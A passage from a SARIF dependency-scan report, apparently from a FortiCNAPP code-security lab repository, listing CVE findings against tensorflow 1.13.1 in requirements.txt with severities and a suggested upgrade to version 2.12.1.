          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ad04eb8f684f0f26ee4e908b5c66cccd0572031b"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29515",
          "ruleIndex": 94,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29515 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29515](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29515)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "06a6ff3bd46eb7c889dd0a1349a4ebe69af0d98a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29535",
          "ruleIndex": 95,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29535 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29535](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29535)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "cfb8254a14ea06eeaf4c60d2352379b5f2aca6ee"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29589",
          "ruleIndex": 96,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29589 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29589](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29589)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "65724d78fae868a6b0821bd43364ddb9374e4c57"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29598",
          "ruleIndex": 97,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29598 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29598](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29598)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "3b751056c34f3d58321fee3b8392506c833d30e8"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29540",
          "ruleIndex": 98,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29540 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29540](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29540)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "58668244ac1335429deb6b42489f17a0eeecd62a"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29513",
          "ruleIndex": 99,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29513 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29513](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29513)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "bdb9bf7a7937829f9effabf126a842c5ef4ac0ee"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29613",
          "ruleIndex": 100,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29613 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29613](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29613)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "99a90fa989d56225831e48c4b6c8c9e93d240acd"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29576",
          "ruleIndex": 101,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29576 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29576](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29576)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "fd41962fdfbf3597595a9a23fd2a155e72aaefd0"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29561",
          "ruleIndex": 102,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29561 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29561](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29561)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "b8b5810c7320a1c215749b6f66a491ffa63b1230"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29604",
          "ruleIndex": 103,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29604 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29604](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29604)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "d22d5a91d350c90f4229f5ac2816ab3c247d4797"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29579",
          "ruleIndex": 104,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29579 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29579](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29579)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "ef679f01c029a63133ec07b8ff0c2ea05ed5859f"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29601",
          "ruleIndex": 105,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29601 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29601](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29601)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "e7ceca934c67d561c0d75fa3444979c924d90e44"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29593",
          "ruleIndex": 106,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29593 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29593](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29593)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "4d116ec984fd6b03dcb3864fc443110263d535c6"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29607",
          "ruleIndex": 107,
          "level": "warning",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29607 (severity: medium, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29607](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29607)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "2c12c35cc0b9a0fcbaef13481b6ce327628c3d47"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29595",
          "ruleIndex": 108,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29595 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29595](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29595)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "0a82fc60161731731cdd0096179ca6993bb83610"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              }
            },
            "repository": {
              "kind": "git",
              "location": "https://github.com/40docs/lab_forticnapp_code_security.git",
              "branch": "main",
              "revision": "5bc71b2d6e32031957fa830224f5c5dbffc97ca2"
            }
          },
          "ruleId": "CVE-2021-29574",
          "ruleIndex": 109,
          "level": "note",
          "message": {
            "text": "Package: tensorflow@1.13.1 (direct)\nVulnerability CVE-2021-29574 (severity: low, fixed in 2.4.2)\nSmartFix: 2.12.1 (Minimal version with no known vulnerabilities)\nLink: [CVE-2021-29574](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29574)\nSample path: requirements.txt -\u003e tensorflow@1.13.1\nExplanation: Why is this SmartFix recommended?\n\nSorted Version Graph for package pkg:pypi/tensorflow@1.13.1\n\nThe Version Graph is too large to be displayed here!\n\nFix recommendations for package pkg:pypi/tensorflow@1.13.1\n  2.12.1 is the minimal version with no known vulnerabilities\n  2.12.1 is the maximum version and it has no known vulnerabilities\n\nStats: the Version Graph has 27 versions (nodes) and 4708 CVEs (edges) (diameter=2)\n\n"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "requirements.txt",
                  "uriBaseId": "%SRCROOT%"
                },
                "region": {
                  "startLine": 7,
                  "endLine": 7
                }
              },
              "message": {
                "text": "requirements.txt: tensorflow@1.13.1"
              }
            }
          ],
          "partialFingerprints": {
            "hash/v1": "55a5119c1da25f6079f8c952904b8bea7d68d303"
          }
        },
        {
          "properties": {
            "dependency": {
              "direct": true
            },
            "lastEdit": {
              "time": "2025-05-01T22:20:01-06:00",
              "revision": "262124f23ccb8f8a520ad2051d4db237d84c340e",
              "author": {
                "name": "AJLab-GH",
                "email": "ajammes.ftnt@gmail.com"
              },
              "committer": {
